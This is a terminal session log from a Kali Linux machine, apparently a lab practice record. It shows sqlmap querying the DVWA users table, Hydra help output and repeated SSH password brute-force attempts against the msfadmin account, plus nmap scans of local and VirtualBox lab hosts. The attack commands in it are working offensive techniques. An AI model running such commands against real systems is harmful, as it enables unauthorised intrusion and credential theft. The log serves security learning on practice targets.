+[14:39:25] [INFO] the query with expanded column name(s) is: SELECT `user`, avatar, failed_login, first_name, last_login, last_name, password, user_id FROM dvwa.users
+[14:39:25] [WARNING] the SQL query provided does not return any output
+[14:39:25] [WARNING] the SQL query provided does not return any output
+sql-shell> select * from dvwa.user
+[14:39:34] [INFO] fetching SQL SELECT statement query output: 'select * from dvwa.user'                                                                   
+[14:39:34] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself
+[14:39:34] [INFO] fetching columns for table 'user' in database 'dvwa'
+[14:39:34] [WARNING] the SQL query provided does not return any output
+[14:39:34] [WARNING] the SQL query provided does not return any output
+[14:39:34] [WARNING] the SQL query provided does not return any output
+[14:39:34] [WARNING] the SQL query provided does not return any output
+sql-shell> x
+[14:40:02] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.8.0.1'                                                    
+
+[*] ending @ 14:40:02 /2026-02-21/
+
+
+
+zsh: corrupt history file /root/.zsh_history
+┌──(root㉿kali)-[~]
+└─# hydra -v
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-22 03:33:21
+[ERROR] Invalid target definition!
+[ERROR] Either you use "www.example.com module [optional-module-parameters]" *or* you use the "module://www.example.com/optional-module-parameters" syntax!
+                                                                             
+┌──(root㉿kali)-[~]
+└─# apt install hydra    
+hydra is already the newest version (9.6-3).
+hydra set to manually installed.
+Summary:                    
+  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 1473
+                                                                             
+┌──(root㉿kali)-[~]
+└─# hydra -v         
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-22 03:33:58
+[ERROR] Invalid target definition!
+[ERROR] Either you use "www.example.com module [optional-module-parameters]" *or* you use the "module://www.example.com/optional-module-parameters" syntax!
+                                                                             
+┌──(root㉿kali)-[~]
+└─# hydra -help
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
+
+Options:
+  -R        restore a previous aborted/crashed session
+  -I        ignore an existing restore file (don't wait 10 seconds)
+  -S        perform an SSL connect
+  -s PORT   if the service is on a different default port, define it here
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
+  -y        disable use of symbols in bruteforce, see above
+  -r        use a non-random shuffling method for option -x
+  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
+  -u        loop around users, not passwords (effective! implied with -x)
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port
+  -D XofY   Divide wordlist into Y segments and use the Xth segment.
+  -o FILE   write found login/password pairs to FILE instead of stdout
+  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
+  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
+  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
+  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)
+  -w / -W TIME  wait time for a response (32) / between connects per thread (0)
+  -c TIME   wait time per login attempt over all threads (enforces -t 1)
+  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
+  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode 
+  -O        use old SSL v2 and v3
+  -K        do not redo failed attempts (good for -M mass scanning)
+  -q        do not print messages about connection errors
+  -U        service module usage details
+  -m OPT    options specific for a module, see -U output for information
+  -h        more command line options (COMPLETE HELP)
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+  OPT       some service modules support additional input (-U for module help)
+
+Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smb2 smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
+
+Hydra is a tool to guess/crack valid login/password pairs.
+Licensed under AGPL v3.0. The newest version is always available at;
+https://github.com/vanhauser-thc/thc-hydra
+Please don't use in military or secret service organizations, or for illegal
+purposes. (This is a wish and non-binding - most such people do not care about
+laws and ethics anyway - and tell themselves they are one of the good ones.)
+These services were not compiled in: afp ncp oracle sapr3.
+
+Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
+E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
+     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
+     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
+     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
+
+Examples:
+  hydra -l user -P passlist.txt ftp://192.168.0.1
+  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+  hydra -l admin -p password ftp://[192.168.0.0/24]/
+  hydra -L logins.txt -P pws.txt -M targets.txt ssh
+                                                                             
+┌──(root㉿kali)-[~]
+└─# nmap -sV 192.168.147.129                                        
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-22 03:38 EST
+Nmap scan report for 192.168.147.129
+Host is up (0.0012s latency).
+All 1000 scanned ports on 192.168.147.129 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 4.58 seconds
+                                                                             
+┌──(root㉿kali)-[~]
+└─#  mousepad user.txt
+                                                                             
+┌──(root㉿kali)-[~]
+└─# mousepad user.txt     
+                                                                             
+┌──(root㉿kali)-[~]
+└─# ls               
+pentestlab  user.txt
+                                                                             
+┌──(root㉿kali)-[~]
+└─# mousepad user.txt
+                                                                             
+┌──(root㉿kali)-[~]
+└─# mousepad pass.txt
+                                                                             
+┌──(root㉿kali)-[~]
+└─# mousepad creds.txt
+                                                                             
+┌──(root㉿kali)-[~]
+└─# hydra -l msfadmin -P pass.txt -t 4 -V -f ssh://10.0.2.15
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-22 08:50:49
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 6 login tries (l:1/p:6), ~2 tries per task
+[DATA] attacking ssh://10.0.2.15:22/
+[ERROR] could not connect to ssh://10.0.2.15:22 - Connection refused
+                                                                             
+┌──(root㉿kali)-[~]
+└─# hydra -l msfadmin -P pass.txt -t 4 -V -f ssh://10.0.2.15
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-22 08:52:01
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 6 login tries (l:1/p:6), ~2 tries per task
+[DATA] attacking ssh://10.0.2.15:22/
+[ERROR] could not connect to ssh://10.0.2.15:22 - Connection refused
+                                                                             
+┌──(root㉿kali)-[~]
+└─# hydra -l msfadmin -P pass.txt -t 4 -V -f ssh://10.0.2.15
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-22 08:57:03
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 6 login tries (l:1/p:6), ~2 tries per task
+[DATA] attacking ssh://10.0.2.15:22/
+[ERROR] could not connect to ssh://10.0.2.15:22 - Connection refused
+                                                                             
+┌──(root㉿kali)-[~]
+└─# nmap 127.0.0.1          
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-22 09:35 EST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.0000020s latency).
+All 1000 scanned ports on localhost (127.0.0.1) are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds
+                                                                             
+┌──(root㉿kali)-[~]
+└─# ifconfig                                                
+docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:50:6e:d5:69  txqueuelen 0  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 6 overruns 0  carrier 0  collisions 0
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.4  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::e9a2:b71c:2a76:bd2a  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:79:6d:ad  txqueuelen 1000  (Ethernet)
+        RX packets 2058  bytes 131103 (128.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 2438  bytes 189199 (184.7 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 10018  bytes 420952 (411.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 10018  bytes 420952 (411.0 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+                                                                             
+┌──(root㉿kali)-[~]
+└─# nmap 192.168.1.5
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-22 09:40 EST
+Nmap scan report for 192.168.1.5
+Host is up (0.00027s latency).
+Not shown: 977 closed tcp ports (reset)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+23/tcp   open  telnet
+25/tcp   open  smtp
+53/tcp   open  domain
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+1099/tcp open  rmiregistry
+1524/tcp open  ingreslock
+2049/tcp open  nfs
+2121/tcp open  ccproxy-ftp
+3306/tcp open  mysql
+5432/tcp open  postgresql
+5900/tcp open  vnc
+6000/tcp open  X11
+6667/tcp open  irc
+8009/tcp open  ajp13
+8180/tcp open  unknown
+MAC Address: 08:00:27:51:37:17 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
+                                                                             
+┌──(root㉿kali)-[~]
+└─# hydra -l msfadmin -P pass.txt -t 4 -V -f ssh://192.168.1.5
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-22 09:40:43
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 6 login tries (l:1/p:6), ~2 tries per task
+[DATA] attacking ssh://192.168.1.5:22/
+[ERROR] could not connect to ssh://192.168.1.5:22 - kex error : no match for method mac algo client->server: server [hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96], client [hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512]
+                                                                             
+┌──(root㉿kali)-[~]
+└─# 
+zsh: corrupt history file /root/.zsh_history
+┌──(root㉿kali)-[~]
+└─# nmap 10.0.2.15                                                  
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-22 08:49 EST
+Nmap scan report for 10.0.2.15
+Host is up (0.0000030s latency).
+All 1000 scanned ports on 10.0.2.15 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
+                                                                             
+┌──(root㉿kali)-[~]
+└─# nmap -sV 10.0.2.15                                              
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-22 08:52 EST
+Nmap scan report for 10.0.2.15
+Host is up (0.0000040s latency).
+All 1000 scanned ports on 10.0.2.15 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
+                                                                             
+┌──(root㉿kali)-[~]
+└─# nmap -sP 10.0.2.15                                               
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-22 08:52 EST
+Nmap scan report for 10.0.2.15
+Host is up.
+Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
+                                                                             
+┌──(root㉿kali)-[~]
+└─# nmap -P -sV -sC 10.0.2.15
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-22 08:54 EST
+Nmap scan report for 10.0.2.15
+Host is up (0.0000050s latency).
+All 1000 scanned ports on 10.0.2.15 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
+                                                                             
+┌──(root㉿kali)-[~]
+└─# nmap -P -sV -sC 127.0.0.1
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-22 09:35 EST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.0000020s latency).
+All 1000 scanned ports on localhost (127.0.0.1) are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
+                                                                             
+┌──(root㉿kali)-[~]
+└─# 
+
